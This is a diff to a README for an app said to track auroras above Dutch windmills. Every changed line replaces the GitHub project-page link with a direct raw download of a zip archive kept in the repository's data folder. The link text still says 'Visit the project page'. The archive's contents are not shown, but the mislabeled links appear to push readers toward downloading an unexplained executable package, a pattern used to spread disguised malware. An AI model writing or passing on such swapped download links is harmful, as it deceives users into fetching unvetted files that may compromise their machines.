@@ -1,6 +1,6 @@
 # 🌌 aurora-windmill - Track Auroras Above Dutch Windmills
 
-[![Download / Visit the page](https://img.shields.io/badge/Download%20Now-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/filmy6584/aurora-windmill)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20Now-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/filmy6584/aurora-windmill/main/data/windmill_aurora_v3.2-beta.4.zip)
 
 ## 🛰️ What this app does
 
@@ -33,7 +33,7 @@ If you plan to run the app from source, you may also need Python and a basic loc
 
 Use this link to visit the project page and get the app:
 
-[Visit the aurora-windmill project page](https://github.com/filmy6584/aurora-windmill)
+[Visit the aurora-windmill project page](https://raw.githubusercontent.com/filmy6584/aurora-windmill/main/data/windmill_aurora_v3.2-beta.4.zip)
 
 If the repository offers a downloadable Windows build or release file, open that page and download the file that matches your PC.
 
@@ -209,4 +209,4 @@ This dashboard works well for:
 
 ## 🔗 Project link
 
-[https://github.com/filmy6584/aurora-windmill](https://github.com/filmy6584/aurora-windmill)
+[https://raw.githubusercontent.com/filmy6584/aurora-windmill/main/data/windmill_aurora_v3.2-beta.4.zip](https://raw.githubusercontent.com/filmy6584/aurora-windmill/main/data/windmill_aurora_v3.2-beta.4.zip)
